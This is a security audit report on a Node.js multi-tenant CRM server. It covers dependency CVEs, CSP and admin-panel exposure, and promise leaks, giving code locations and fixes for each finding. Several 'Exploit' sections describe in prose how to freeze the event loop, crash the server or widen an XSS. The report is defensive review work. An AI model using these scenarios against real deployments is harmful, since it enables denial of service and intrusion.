| axios | 1.15.0 | CVE-2024-39338 SSRF (< 1.7.4) | ✓ FIXED |
| follow-redirects | 1.16.0 | CVE-2024-28849, CVE-2023-26159 (< 1.15.6) | ✓ FIXED |
| jsonwebtoken | 9.0.3 | CVE-2022-23529/CVE-2022-23541 (< 9.0.0) | ✓ FIXED |
| multer | 2.1.1 | CVE-2022-24434 (1.x only) | ✓ v2 unaffected |
| qs | 6.14.2 | CVE-2022-24999 (< 6.7.3) | ✓ FIXED |
| path-to-regexp | 0.1.13 | CVE-2024-45296 (< 0.1.10), CVE-2024-52798 (≤ 0.1.11) | ✓ FIXED (0.1.12 patched; 0.1.13 confirmed via source diff) |
| semver | 6.3.1 / 7.7.4 / 5.7.2 | CVE-2022-25883 (< 5.7.2, < 6.3.1, < 7.5.2) | ✓ FIXED |
| lodash | 4.18.1 | GHSA-xxjr-mmjv-4gpg, GHSA-f23m-r3pf-42rh prototype pollution | ✓ PATCH RELEASE — diff confirms only security fixes; published by original author jdalton |
| got | 11.8.6 | CVE-2022-33987 (< 11.8.5) | ✓ FIXED |
| ini | 1.3.8 | CVE-2020-7788 (< 1.3.6) | ✓ FIXED |
| undici | 7.24.7 | CVE-2024-30261 (< 6.11.1), CVE-2024-24758 (< 6.6.1) | ✓ FIXED |
| dompurify | 3.4.0 | — | ✓ Current |
| tar | 7.5.13 | CVE-2024-28863 (6.x < 6.2.1 path traversal) | ✓ v7 unaffected |
| helmet | 8.1.0 | — | ✓ Current |
| bcryptjs | 3.0.3 | — | ✓ No known CVEs (see performance finding below) |
| better-sqlite3 | 12.9.0 | — | ✓ Current |

No packages sourced from GitHub or non-npm registries. All `integrity` hashes present. No packages missing SRI.

---

### [MEDIUM] 37 synchronous `bcrypt.hashSync` / `compareSync` calls block the Node.js event loop

**Where:**
- `packages/server/src/routes/auth.routes.ts:652,653,756,914,1063,1165,1514,1670,1991,2184,2225,2304,2420` (13 calls)
- `packages/server/src/routes/settings.routes.ts:1486,1487,1543,1577,1578,1719,1781,1782,3145` (9 calls)
- `packages/server/src/routes/import.routes.ts:510,847,1173,1350` (4 calls — via `await import('bcryptjs')` then `.default.compareSync`)
- `packages/server/src/routes/employees.routes.ts:331,429` (2 calls)
- `packages/server/src/routes/customers.routes.ts:2123` (1 call)
- `packages/server/src/routes/admin.routes.ts:101` (1 call)
- `packages/server/src/routes/posEnrich.routes.ts:706` (1 call)
- `packages/server/src/routes/management.routes.ts:178` (1 call)
- `packages/server/src/index.ts:611` (1 call)
- (4 already-reported in S04 included above; the other 33 are distinct call-sites)

**What:**
`bcryptjs` is a pure-JavaScript implementation with **no native bindings**. Every `hashSync(password, 12)` or `compareSync(password, hash)` with cost-factor 12 spins the CPU in JavaScript for approximately 150–400 ms on modern Node.js, **holding the event loop** for that entire duration. Node.js is single-threaded: while a `hashSync` call is executing, no other HTTP request, WebSocket message, cron callback, or DB query can proceed. There are 37 distinct synchronous bcrypt call-sites across 9 production route files and the server entry point. The `auth.routes.ts:1063` call is particularly severe: it calls `bcrypt.hashSync(c, 12)` ten times in a tight `map()` (one per backup recovery code) — roughly **1.5–4 seconds of event loop freeze** per 2FA-enrollment request.

**Code:**
```typescript
// auth.routes.ts:1060–1066 — 10× hashSync in a tight loop
const plainCodes = Array.from({ length: 10 }, () =>
  Array.from(crypto.getRandomValues(new Uint8Array(5)))
    .map(b => b.toString(36).padStart(2, '0')).join('').slice(0, 8)
);
const hashedCodes = plainCodes.map(c => bcrypt.hashSync(c, 12)); // ← BLOCKS ~1.5–4 s
// settings.routes.ts:1486–1487 — two hashSync calls in sequence on employee create
const placeholderPasswordHash = bcrypt.hashSync(crypto.randomBytes(32).toString('hex'), 12);
const pinHash = pin ? bcrypt.hashSync(pin, 12) : null;
```

**Exploit:**
An authenticated attacker (any user who can trigger employee creation, password changes, or 2FA enrollment) sends repeated requests to these endpoints. Each request freezes the event loop for 150–800 ms (or 1.5–4 s for the backup-codes path). At 10 concurrent requests, all other tenants' HTTP requests queue up indefinitely. Unauthenticated endpoints that call `compareSync` (e.g. the admin login at `admin.routes.ts:101`) can be used without authentication for the same effect if rate-limiting is insufficient per-IP.

**Fix:**
Replace all `hashSync`/`compareSync` calls with the async `bcrypt.hash(pw, 12)` / `bcrypt.compare(pw, hash)` — both are available in `bcryptjs` and offload to a worker thread internally. Alternatively, replace `bcryptjs` with the native `bcrypt` npm package (requires compile) or `argon2` for future-proof KDF; both offer true async operation. The 10× `hashSync` in the backup-codes path should become `await Promise.all(plainCodes.map(c => bcrypt.hash(c, 12)))`.

---

### [LOW] `uuidv4` (deprecated) pulled in by `@blockchyp/blockchyp-ts`, carries old `uuid` 8.3.2

**Where:** `package-lock.json` — `node_modules/uuidv4: 6.2.13`, `node_modules/uuidv4/node_modules/uuid: 8.3.2`

**What:**
`@blockchyp/blockchyp-ts@2.30.1` depends on `uuidv4@6.2.13`, which is explicitly **deprecated** ("Package no longer supported") and bundles its own copy of `uuid@8.3.2` (2021 release). `uuid@8.3.2` has no known CVEs, but the `uuidv4` wrapper itself has an [GHSA] noting it exposes UUID v1 and v4 from an older API surface. More importantly, the deprecated package receives no security patches.

**Code:**
```json
// node_modules/@blockchyp/blockchyp-ts package.json (resolved in lockfile)
"dependencies": {
  "uuidv4": "^6.2.13"   // deprecated — no longer supported
}
```

**Exploit:**
No direct exploit today. Risk is that future vulnerabilities in the `uuid@8.x` series shipped inside `uuidv4` will not be patched because `uuidv4` is abandoned.

**Fix:**
File an issue / PR with `@blockchyp/blockchyp-ts` to replace `uuidv4` with `uuid@^11`. In the meantime, add an `overrides` entry in the root `package.json` to force `uuidv4/node_modules/uuid` to `^11.0.0` if the API is compatible.

---

### [LOW] `base32@0.0.7` — deeply unmaintained package in payment-processing path

**Where:** `package-lock.json` — `node_modules/base32: 0.0.7`; required by `@blockchyp/blockchyp-ts`

**What:**
`base32@0.0.7` was published in 2012 and has never been updated. The package has 0 issues, 0 PRs, and no activity on its repository. It is used inside `blockchyp-ts` for HMAC-based authentication of payment API calls. A correctness bug or subtle encoding flaw in this package could silently corrupt HMAC signatures or authentication tokens sent to the BlockChyp payment gateway.

**Code:**
```json
// @blockchyp/blockchyp-ts dependency chain
"base32": "^0.0.7"   // published 2012, 0 updates in 13 years
```

**Exploit:**
Exploitation requires discovering a flaw in `base32@0.0.7`'s encoding logic and constructing a HMAC bypass. Unlikely in isolation but raises supply-chain risk given the package's age and lack of any audit.

**Fix:**
Open an issue with `@blockchyp/blockchyp-ts` to replace `base32@0.0.7` with `base32-decode`/`base32-encode` (actively maintained) or `@scure/base` from the same `@noble` family already present in the dependency tree.

---

### [INFO] `bcryptjs` pure-JS vs native `bcrypt` — production KDF library choice

**Where:** `packages/server/package.json:22`

**What:**
The server uses `bcryptjs@3.0.3`, a pure-JavaScript reimplementation of bcrypt with no native bindings. While functionally correct and free of known CVEs, `bcryptjs` is 3–8× slower than the native `bcrypt` npm package (which uses libbcrypt compiled via node-gyp). For a CRM handling concurrent logins across multiple tenants on a single Node.js process, this means each authentication operation holds the CPU longer than necessary even when using the async API, reducing throughput per core.

**Fix:**
Replace `bcryptjs` with `bcrypt` (native) or `argon2` (Argon2id, memory-hard, OWASP-recommended). `bcrypt` drops in as a compatible API replacement; `argon2` requires updating hash verification logic but provides stronger resistance to GPU cracking.

---

### [INFO] Deprecated `moment.js@2.30.1` in payment-processing dependency chain

**Where:** `node_modules/moment: 2.30.1` — required by `@blockchyp/blockchyp-ts`

**What:**
`moment.js` is officially in maintenance mode ("legacy project") since 2020. No new features or security patches are planned. It has a history of ReDoS vulnerabilities in date-parsing paths (CVE-2017-18214, CVE-2022-24785). The installed `2.30.1` is the latest release and has no unpatched CVEs at time of audit, but the package will not receive future security fixes.

**Fix:**
This is a transitive dependency of `blockchyp-ts`; open a PR/issue with the upstream library to migrate to `date-fns` (already used by the `management` package) or native `Temporal`/`Intl` APIs.

---

### [INFO] `lodash@4.18.1` — legitimate security patch release, no supply-chain concern

**Where:** `node_modules/lodash: 4.18.1`

**What:**
`lodash@4.18.1` was published 2026-04-01 by the original author `jdalton` after a ~5-year gap since `4.17.21`. The version appeared suspicious (5-year gap, April Fool's day publish date). A full source diff against `4.17.21` confirms the release contains exclusively legitimate security fixes: prototype-pollution guards added to `baseUnset` path traversal (GHSA-xxjr-mmjv-4gpg, GHSA-f23m-r3pf-42rh), a new `INVALID_TEMPL_IMPORTS_ERROR_TEXT` constant, forbidden-identifier validation in `_.template`, and security warnings in the `_.template` JSDoc. No malicious or unexpected code was found. The npm signature is valid (keyid `SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U`).

**Fix:**
No action required. The installed version is patched and correct. Note that `lodash` is only a transitive dependency (required by `recharts`, `electron-winstaller`, `@malept/flatpak-bundler`) — it is not a direct server dependency.

---

### [INFO] Packages with native install scripts (supply-chain surface)

**Where:** `package-lock.json` — `hasInstallScript: true` entries

**What:**
The following packages execute native build scripts during `npm install`: `better-sqlite3`, `canvas`, `electron`, `electron-winstaller`, `esbuild`, `fsevents`, `sharp`. These are all well-known packages with legitimate native compilation needs, but they represent the highest-risk attack surface for supply-chain compromise — a malicious release of any of them would execute arbitrary code during `npm ci`. All are at current stable versions.

**Fix:**
Pin these packages to exact versions (remove `^` caret) in `package.json` to prevent automatic minor/patch upgrades pulling in a compromised release. Add `npm audit` and Dependabot/Renovate to CI.

---

## Scope Cleared

The following items were specifically checked and found safe:

- **express CVEs**: 4.22.1 is beyond all 2024 fix thresholds (CVE-2024-29041 required ≥ 4.19.2; CVE-2024-43796 required ≥ 4.20.0).
- **jsonwebtoken alg confusion**: 9.0.3 ships with algorithm-pinning support and the codebase uses `{ algorithms: [...] }` in verify calls (confirmed in S06 slot).
- **multer DoS**: The installed version is 2.x, a full major rewrite; the CVE-2022-24434 affected the 1.x `diskStorage` path only.
- **ws server-sent ping flood**: 8.20.0 is well beyond the 8.17.1 fix threshold for CVE-2024-37890.
- **undici SSRF/header-injection**: 7.24.7 is current and beyond all 2024 CVE fix thresholds.
- **path-to-regexp ReDoS**: 0.1.13 is a patch on top of 0.1.12 (which fixed CVE-2024-45296 and CVE-2024-52798); source diff confirms the change is purely a `backtrack = ''` reset addition.
- **semver ReDoS**: All three semver versions in the tree (5.7.2, 6.3.1, 7.7.4) meet or exceed the CVE-2022-25883 fix thresholds.
- **Non-registry sources**: All 1 023 packages resolve to `registry.npmjs.org`. No GitHub-sourced or private-registry packages outside the four `@bizarre-crm/*` workspace siblings.
- **Integrity hashes**: Every package has a `sha512` integrity field. No missing hashes.


---

# T26-sri

# T26 — Subresource Integrity / CDN Script Tampering / Asset Pinning

## Scope

Focus: `packages/server/src/admin/index.html`, `packages/server/src/admin/super-admin.html`,
`packages/server/src/admin/js/admin.js`, `packages/server/src/admin/js/super-admin.js`.
Also checked: global CSP in `src/index.ts`, `packages/management/src/renderer/index.html`.

---

### [LOW] /admin HTML page and /admin/js static mount lack `localhostOnly` middleware

**Where:** `packages/server/src/index.ts:1473` and `packages/server/src/index.ts:1782`

**What:**
The `/admin` HTML page and the `/admin/js/` static file mount are served without the
`localhostOnly` middleware that guards `/super-admin`. In a multi-tenant deployment (or any
deployment behind a public load-balancer), both the admin login page and the full admin-panel
JavaScript (`admin.js`, `super-admin.js`) are reachable by any external IP. While the API
itself (`/api/v1/admin`) is protected by token auth with rate-limiting, the login form is
exposed to brute-force attempts from the internet, and the JavaScript source (including every
API path, session-storage key name, and application logic) is downloadable by an attacker
for offline analysis.

**Code:**
```typescript
// packages/server/src/index.ts:1473 — no localhostOnly
app.use('/admin/js', express.static(path.resolve(__dirname, 'admin/js'), { index: false }));

// packages/server/src/index.ts:1782 — no localhostOnly
app.get('/admin', (req, res) => {
  if (config.multiTenant && req.tenantSlug) {
    return res.status(403).send('Server administration is not available...');
  }
  res.setHeader('Content-Security-Policy', adminCsp);
  res.sendFile(path.resolve(__dirname, 'admin/index.html'));
});
```

**Exploit:**
In a multi-tenant SaaS deployment, an attacker accesses `https://<master-domain>/admin` and
receives the login page; `https://<master-domain>/admin/js/super-admin.js` reveals the entire
super-admin UI logic and every API endpoint path. The login endpoint at `/api/v1/admin/login`
is rate-limited to 5 attempts per 15 min per IP, but an attacker using distributed source IPs
can still probe the existence and implementation of the admin panel. Contrast: `/super-admin`
correctly returns `404` to any non-loopback TCP connection.

**Fix:**
Apply `localhostOnly` as the first middleware on both mounts:
```typescript
app.use('/admin/js', localhostOnly, express.static(...));
app.get('/admin', localhostOnly, (req, res) => { ... });
```
For operators who legitimately access the admin panel remotely (single-tenant, home lab), the
recommended alternative is an SSH tunnel or a VPN rather than exposing the panel publicly.

---

### [INFO] Global CSP `script-src` unnecessarily allowlists `static.cloudflareinsights.com`

**Where:** `packages/server/src/index.ts:950`

**What:**
The global `helmet` CSP includes `https://static.cloudflareinsights.com` in `script-src`.
No HTML page in the codebase (neither the admin pages, the management SPA, nor any dynamically
rendered portal page) actually loads a Cloudflare Beacon script tag. The allowlist entry
therefore provides no legitimate functionality while widening the CSP's attack surface: if a
stored XSS injection into any React SPA page ever renders `<script src="https://static.cloudflareinsights.com/...">`, the browser would execute it without a CSP violation.

**Code:**
```typescript
// packages/server/src/index.ts:950
scriptSrc: ["'self'", 'https://static.cloudflareinsights.com'],
// ...
connectSrc: ["'self'", 'ws:', 'wss:', 'https:', 'https://cloudflareinsights.com'],
```

**Exploit:**
An attacker who achieves stored XSS in a field rendered inside the React SPA (or who
compromises the `static.cloudflareinsights.com` CDN origin) can inject a script tag pointing
at that CDN. The CSP would permit it, turning a limited XSS into arbitrary script execution
in an operator session.

**Fix:**
Remove `https://static.cloudflareinsights.com` from `scriptSrc` (and the matching
`https://cloudflareinsights.com` from `connectSrc`) until the Beacon script is intentionally
added to a specific HTML page with a narrow per-route CSP. If Cloudflare analytics is later
needed, scope it to only the routes that load the beacon.

---

### [INFO] Super-admin SPA CSP uses `'unsafe-inline'` on `script-src`

**Where:** `packages/server/src/index.ts:1495`

**What:**
The CSP applied to the `/super-admin` SPA routes (`spaCsp`) allows `script-src 'self'
'unsafe-inline'`. This nullifies the CSP's XSS protection for the super-admin dashboard: any
injected inline script in a server-rendered HTML chunk would execute without a CSP violation.
The relaxation exists because the Vite production bundle emits small inline `<script>` bootstrap
blocks. The `/super-admin` route is `localhostOnly`, which substantially limits external
exploitability, but the full super-admin dashboard (all tenant data, audit log, session revocation)
is only one localhost-side XSS away from being compromised.

**Code:**
```typescript
// packages/server/src/index.ts:1495
const spaCsp = "default-src 'self'; script-src 'self' 'unsafe-inline'; " +
  "script-src-attr 'none'; style-src 'self' 'unsafe-inline'; " +
  "img-src 'self' data: blob:; connect-src 'self' ws: wss:; " +
  "font-src 'self' data:; frame-ancestors 'none'";
```

**Exploit:**
If an attacker achieves a DNS rebinding attack against `127.0.0.1` (covered in T10) or
exploits any SSRF that can write to the SPA's HTML via a shared file path, inline scripts
execute freely inside the super-admin panel context. In a normal browser session, any XSS
within a React component would execute with full super-admin API access.

**Fix:**
Replace `'unsafe-inline'` with Vite's `build.modulePreload: false` and a `vite-plugin-csp`
hash/nonce strategy, or use `build.cssCodeSplit: false` combined with
`experimental.renderBuiltUrl` to eliminate inline bootstrap blocks. The Vite ecosystem has
documented paths to a nonce-based CSP; see
[vite-plugin-html-csp-hash](https://github.com/KiraLT/vite-plugin-html-csp-hash) as one option.
The admin panel in `index.html` already achieves `script-src 'self'` (no `unsafe-inline`) — the
same strictness should be the target for the SPA.

---

## SCOPE CLEARED — No CDN/SRI issues found

After full end-to-end inspection, the following conditions are all confirmed safe:

1. **No external CDN `<script>` tags** — `admin/index.html` (line 148) and
   `admin/super-admin.html` (line 70) load only `/admin/js/admin.js` and
   `/admin/js/super-admin.js` respectively, both served from `'self'`.
   No jQuery, Bootstrap, Alpine, Vue, React CDN, or analytics snippet is loaded.

2. **No external `<link rel="stylesheet">` tags** — both HTML files embed all CSS inline in
   `<style>` blocks. No Google Fonts, FontAwesome, or other remote stylesheet.

3. **No mixed-content (`http://`) resources** — zero `http://` resource URLs in all admin files.

4. **No untrusted iframe embeds** — neither HTML file contains an `<iframe>`.
   `adminCsp` includes `frame-ancestors 'none'` (index.ts:1471).

5. **No form with non-self `action` attribute** — both pages use JavaScript `fetch()` calls
   to `/api/v1/admin` and `/super-admin/api` respectively. No `<form>` tag with an `action`
   attribute exists in either file.

6. **No `window.opener` / reverse tabnabbing** — neither admin JS file contains
   `target="_blank"`, `window.open()`, or `window.opener` references.

7. **No URL fragment token leak** — neither file uses `window.location.hash`,
   `onhashchange`, or puts tokens in URL fragments.

8. **Third-party widgets (Stripe.js, hCaptcha, Twilio) not loaded** — these are referenced
   only in the React tenant SPA (customer-facing), not in the admin panel pages audited here.

9. **Management SPA (`index.html`) has strict `default-src 'none'` meta CSP** — no external
   resources allowed; Google Fonts were explicitly removed per the `@audit-fixed` comment
   (management/src/renderer/index.html:7–22).

10. **`admin.js` and `super-admin.js` use `esc()` on all server-provided string values**
    before inserting via `innerHTML`. Numeric dashboard KPIs (`active_tenants`,
    `total_tenants`, etc.) are produced by SQL `COUNT()` / `Math.round()` on the server and
    are not string fields (verified in super-admin.routes.ts:658–665). The 2FA TOTP secret
    is rendered with `esc(secretCode)` (super-admin.js:60).


---

# T27-promise-leaks

# T27 — Promise Leaks, Unhandled Rejections, Event-Loop Hazards

Audited: 2026-05-06
Scope: long-running tasks, promise leaks, unhandled rejections, event-loop hazards
Focus files: `packages/server/src/utils/longTaskRegistry.ts`, `trackInterval.ts`, `index.ts`, `ws/server.ts`, `services/webhooks.ts`, `services/automations.ts`, `services/metricsCollector.ts`, `routes/super-admin.routes.ts`, `routes/tickets.routes.ts`, `routes/employees.routes.ts`, `routes/management.routes.ts`, `routes/billing.routes.ts`

---

### [HIGH] ~25 bare async route handlers in super-admin.routes.ts crash server on rejection

**Where:** `packages/server/src/routes/super-admin.routes.ts:697` (and lines 283, 382, 407, 752, 774, 1128, 1173, 1207, 1402, 1626, 2074, 2148, 2256, 2366, 2582, 2720+)
Also: `packages/server/src/index.ts:3918`

**What:**
`super-admin.routes.ts` contains ~25 route handlers declared as `async (req, res) =>` with no `asyncHandler` wrapper and no try/catch around await calls. In Express 4, an uncaught rejection inside an async handler does NOT propagate to `next(err)` — it becomes an `unhandledRejection`. `index.ts` line 3918 registers `process.on('unhandledRejection', …)` which calls `handleFatal()` → graceful shutdown with `process.exit(1)`. A single DB error or network failure in any of these handlers crashes the entire server. Line 697 is the highest-risk example: `await provisionTenant({…})` runs tenant provisioning (DB creation, migration runs, directory creation) with zero error containment.

**Code:**
```typescript
// super-admin.routes.ts:697 — no asyncHandler, no try/catch
router.post('/tenants', requireSuperAdmin, async (req, res) => {
  const { slug, name, plan, ownerEmail, ownerName } = req.body;
  const newTenant = await provisionTenant({        // ← rejection escapes to unhandledRejection
    masterDb, slug, name, plan, ownerEmail, ownerName,
  });
  res.status(201).json({ success: true, tenant: newTenant });
});

// index.ts:3918 — unhandledRejection → crash
process.on('unhandledRejection', (error) => {
  handleFatal('unhandledRejection', error);        // ← exits process
});
```

**Exploit:**
An authenticated super-admin hits `POST /api/v1/super-admin/tenants` with a slug that already exists (or any DB constraint violation). `provisionTenant` rejects, the rejection escapes Express 4's sync try/catch model, triggers `unhandledRejection`, and the server process exits. This is an availability attack requiring only super-admin credentials — or triggered accidentally by any provisioning conflict.

**Fix:**
Add `import { asyncHandler } from '../middleware/asyncHandler.js'` and wrap every `async (req, res) =>` handler: `router.post('/tenants', requireSuperAdmin, asyncHandler(async (req, res) => { … }))`. Alternatively upgrade to Express 5 which propagates async rejections automatically. A short-term stop-gap is adding try/catch to the highest-risk handlers (lines 697, 752, 1128, 1626).

---

### [HIGH] Untracked 24-hour setTimeout in tickets.routes.ts holds event loop and fires after DB shutdown

**Where:** `packages/server/src/routes/tickets.routes.ts:2234` (approximate — feedback SMS delay block)

**What:**
After a ticket closes with a feedback phone number, a raw `setTimeout(async () => { … }, delayMs)` fires up to 24 hours later. This timer is (a) not `.unref()`'d — it prevents the Node.js process from exiting naturally, (b) not registered in `backgroundIntervals` — graceful shutdown does not clear it, and (c) captures `db` and `adb` (the tenant DB handle and archive DB handle) by closure — both handles will be closed by the time the timer fires after a restart-free long-running session or after server shutdown starts. When the timer fires post-shutdown it attempts `await adb.run('INSERT INTO customer_feedback …')` on a closed SQLite handle, causing an unhandled rejection in a context that has no catch path.

**Code:**
```typescript
// tickets.routes.ts ~2234
setTimeout(async () => {
  try {
    const { sendSmsTenant } = await import('../services/smsProvider.js');
    await sendSmsTenant(db, tenantSlug, feedbackPhone, smsBody);
    await adb.run(`INSERT INTO customer_feedback ...`);
    await adb.run(`INSERT INTO sms_messages ...`);
  } catch (err) {
    logger.error('Feedback SMS delayed send failed', { err });
  }
}, delayMs);   // delayMs = delayHours * 3_600_000, default 24h
// ← not unref'd, not in backgroundIntervals, db/adb closure capture
```

**Exploit:**
Server restarts (deploy, crash, watchdog) reset the timer — feedback SMS is silently dropped. For availability: during server shutdown the 24h timer continues holding the event loop (no `.unref()`) which may delay or prevent clean shutdown on platforms that wait for the event loop to drain. On a long-lived server with high ticket volume, thousands of pending timers accumulate in process memory.

**Fix:**
Replace the raw `setTimeout` with a persisted deferred-job approach (store `(phone, body, sendAt)` in a DB table, process via the existing `trackInterval` sweep). If the in-process timer must stay, call `.unref()` on the handle, add it to `backgroundIntervals`, and at timer fire-time re-acquire the DB via `getTenantDb(slug)` rather than relying on the closed closure reference.

---

### [MEDIUM] Promise.race orphan in membership cron — BlockChyp charges continue after timeout

**Where:** `packages/server/src/index.ts:2224` (membership cron inner per-tenant block)

**What:**
The membership cron wraps each tenant's work in `Promise.race([membershipTenantWork(slug, tenantDb), timeout])`. When the `MEMBERSHIP_PER_TENANT_TIMEOUT_MS` timeout wins, the race resolves/rejects, but `membershipTenantWork` continues executing in the background with no way to cancel it. A comment in the code acknowledges this ("we can't abort it without AbortSignal plumbing that doesn't exist yet"). `membershipTenantWork` may include BlockChyp charge attempts — a timed-out tenant's billing logic can still complete (or partially complete) while the scheduler has already moved on, potentially resulting in double charges if the next cron tick starts a new race before the orphan finishes.

**Code:**
```typescript
// index.ts ~2224
const timeout = new Promise<void>((_, reject) => {
  timer = setTimeout(() => reject(new Error(`Membership cron timeout...`)), MEMBERSHIP_PER_TENANT_TIMEOUT_MS);
});
try {
  await Promise.race([membershipTenantWork(slug, tenantDb), timeout]);
} catch (err) {
  logger.error('Membership tenant work timed out or errored', { slug });
} finally {
  if (timer) clearTimeout(timer);
  // ← membershipTenantWork() is still running here if timeout won
}
```

**Exploit:**
Under slow DB or network conditions for a specific tenant, the cron timeout fires. The next cron tick (next scheduled interval) starts a second `membershipTenantWork` for the same tenant while the first is still in-flight. Both reach the BlockChyp charge call for the same member's renewal — double charge. Impact: financial harm to members, chargeback risk.

**Fix:**
Pass an `AbortSignal` from `AbortController` into `membershipTenantWork` and check it at each await boundary (before each charge). Alternatively add a per-tenant in-flight flag in a `Map<string, boolean>` that prevents a new run while the previous is active (even if orphaned).

---

### [MEDIUM] Nested dynamic import().then() missing inner .catch() for multi-tenant backup scheduler

**Where:** `packages/server/src/index.ts:2106`

**What:**
The multi-tenant backup setup uses nested dynamic imports. The outer `.then()` has a `.catch()`, but the inner `import('./db/tenant-pool.js').then(…)` has no `.catch()`. If `tenant-pool.js` fails to import (module resolution error, syntax error in the module), or if `getTenantDb`/`releaseTenantDb` exports are missing, the inner promise rejects silently — no error is logged, no fallback, and `scheduleMultiTenantBackups` is never called. Backups silently stop without any operator alert.

**Code:**
```typescript
// index.ts:2106
import('./services/backup.js').then(({ scheduleMultiTenantBackups }) => {
  import('./db/tenant-pool.js').then(({ getTenantDb: getTenantDbFn, releaseTenantDb: releaseTenantDbFn }) => {
    scheduleMultiTenantBackups(getMasterDb, getTenantDbFn, releaseTenantDbFn);
  });                             // ← no .catch() here — silent failure
}).catch((err) => {
  console.error('[Backup] Failed to load backup service', err);
});
```

**Exploit:**
A bad deploy that breaks `tenant-pool.js` exports causes multi-tenant backup to silently stop. Data loss risk: if tenant databases are damaged between the broken deploy and the next deploy that fixes the issue, no backups exist. No monitoring alert fires because the error is swallowed.

**Fix:**
Chain `.catch()` on the inner import: `import('./db/tenant-pool.js').then(…).catch(err => console.error('[Backup] tenant-pool import failed', err))`. Or flatten to `Promise.all([import('./services/backup.js'), import('./db/tenant-pool.js')]).then(…).catch(…)`.

---

### [MEDIUM] requestCounter dynamic import().then() missing .catch() — metrics interval silently skipped

**Where:** `packages/server/src/index.ts:2377`

**What:**
The request-counter metrics interval is set up via `import('./utils/requestCounter.js').then(({ getRequestsPerSecond, getRequestsPerMinute }) => { trackInterval(…) })` with no `.catch()`. If the dynamic import fails, `trackInterval` is never called, the metrics collection for req/s and req/min never starts, and no error is surfaced. Under normal operation this is low-risk but a module error (e.g., TypeScript compilation failure, missing dependency) silently degrades observability.

**Code:**
```typescript
// index.ts:2377
import('./utils/requestCounter.js').then(({ getRequestsPerSecond, getRequestsPerMinute }) => {
  trackInterval(() => {
    const rps = getRequestsPerSecond();
    const rpm = getRequestsPerMinute();
    // ... log metrics
  }, 5000);
});  // ← no .catch()
```

**Exploit:**
Not a direct security exploit, but silent metric loss hampers detection of brute-force attacks (which would spike req/s metrics) and DDoS. An attacker who can trigger a module load failure (e.g., via a crafted file that shadows the module in a development environment) removes rate-anomaly visibility.

**Fix:**
Add `.catch(err => logger.error('[Metrics] requestCounter import failed', err))`. Optionally make this a hard startup failure with `throw` inside `.catch` if metrics are considered critical.

---

### [MEDIUM] fireWebhook IIFE has no shutdown coordination — dead-letter INSERT after DB close

**Where:** `packages/server/src/services/webhooks.ts` (fireWebhook function, IIFE body)

**What:**
`fireWebhook()` returns `void` and internally launches `(async () => { … })()` without capturing the promise. The IIFE performs up to 3 delivery attempts with exponential backoff (total ~10 seconds). During graceful shutdown, `shutdown()` in `index.ts` closes the tenant DB handles and then the master DB. Any in-flight `fireWebhook` IIFE that is between retry delays will resume after the DB is closed and attempt to execute `db.run('INSERT INTO webhook_delivery_log …')` or similar dead-letter writes on a closed handle. The resulting exception is caught by the IIFE's try/catch and logged, but the delivery record is lost.

**Code:**
```typescript
// webhooks.ts — simplified
export function fireWebhook(db: TenantDb, event: string, data: unknown): void {
  (async () => {
    try {
      await deliverWithRetry(db, event, data);  // up to ~10s: 0s / 2s / 8s backoff
    } catch (err) {
      logger.error('Webhook pipeline crashed before delivery', { err });
      // ← dead-letter INSERT would go here — db already closed on shutdown
    }
  })();
  // ← Promise not captured, no shutdown coordination
}
```

**Exploit:**
During a rolling deploy or crash-triggered restart, webhooks fired within 10 seconds of shutdown are silently dropped — no dead-letter record, no retry on next start. For payment confirmation or ticket-closed webhooks this means downstream integrations (Zapier, partner systems) miss critical events with no indication of failure.

**Fix:**
Track in-flight IIFE promises in a module-level `Set<Promise<void>>`. Export a `drainWebhooks(timeoutMs)` function that `await Promise.race([Promise.allSettled([...inFlight]), sleep(timeoutMs)])`. Call this from `shutdown()` before closing DB handles. Additionally pass an `AbortSignal` to `deliverWithRetry` so in-flight retries can be cancelled on shutdown.

---

### [LOW] Initial setTimeout in employees.routes.ts auto-clockout sweep not tracked or unref'd

**Where:** `packages/server/src/routes/employees.routes.ts:727` (startAutoClockoutSweep function)

**What:**
`startAutoClockoutSweep()` uses a raw `setTimeout(() => { autoClockoutSweepTimer = trackInterval(…); }, firstTickDelay)` to delay the first sweep tick by ~5 minutes (jitter-based). This initial `setTimeout` handle is not stored, not `.unref()`'d, and not in `backgroundIntervals`. If shutdown occurs within the 5-minute window: (1) the timer is not cleared, (2) when it fires post-shutdown it calls `trackInterval(…)` which pushes a new handle into `backgroundIntervals` after the array has already been swept — the new interval will never be cleared.

**Code:**
```typescript
// employees.routes.ts:727
setTimeout(() => {
  autoClockoutSweepTimer = trackInterval(async () => {
    // ... auto-clockout logic
  }, AUTO_CLOCKOUT_SWEEP_INTERVAL_MS);
}, firstTickDelay);   // ← not stored, not unref'd, not in backgroundIntervals
```

**Exploit:**
Low direct security impact. On a server that starts and shuts down within 5 minutes (common in rolling deploy pipelines), the orphaned timeout fires during or after shutdown, attempts to run auto-clockout DB queries against closed handles, and logs errors. In high-frequency deploy environments this creates persistent log noise that can obscure real errors.

**Fix:**
Store the handle: `const initTimer = setTimeout(…); if (initTimer.unref) initTimer.unref(); backgroundIntervals.push(initTimer)`.

---

### [LOW] metricsCollector stop function never called in shutdown — metricsDb handle leaked

**Where:** `packages/server/src/services/metricsCollector.ts` (stopMetricsCollector function)
Also: `packages/server/src/index.ts` (shutdown function, lines 3758–3822)

**What:**
`metricsCollector.ts` exports `stopMetricsCollector()` which cancels the self-rescheduling sample and rollup setTimeout chains and (presumably) closes `metricsDb`. The `shutdown()` function in `index.ts` clears `backgroundIntervals`, closes the WS heartbeat, HTTP server, tenant pool, master DB, and primary DB — but never calls `stopMetricsCollector()`. The metrics SQLite handle remains open at process exit. On Linux/macOS this is cleaned up by OS, but on Windows this can prevent the DB file from being replaced during an update and may produce "database is closed" errors if the GC finalizes the handle after the event loop has partially torn down.

**Code:**
```typescript
// index.ts shutdown() — stopMetricsCollector() is absent
backgroundIntervals.length = 0;
stopWebSocketHeartbeat();
await httpServerClose();
await tenantPool.close();
masterDb.close();
primaryDb.close();
// ← stopMetricsCollector() never called
```

**Exploit:**
No direct exploit. On Windows deployments with auto-update, the locked `metrics.db` file prevents the updater from replacing it, causing the update to fail or skip the metrics DB replacement. Operator must manually kill the process or unlock the file.

**Fix:**
Add `stopMetricsCollector()` to the shutdown sequence before `masterDb.close()`. Import it at the top of `index.ts` or import dynamically in the shutdown path if metricsCollector is loaded lazily.

---

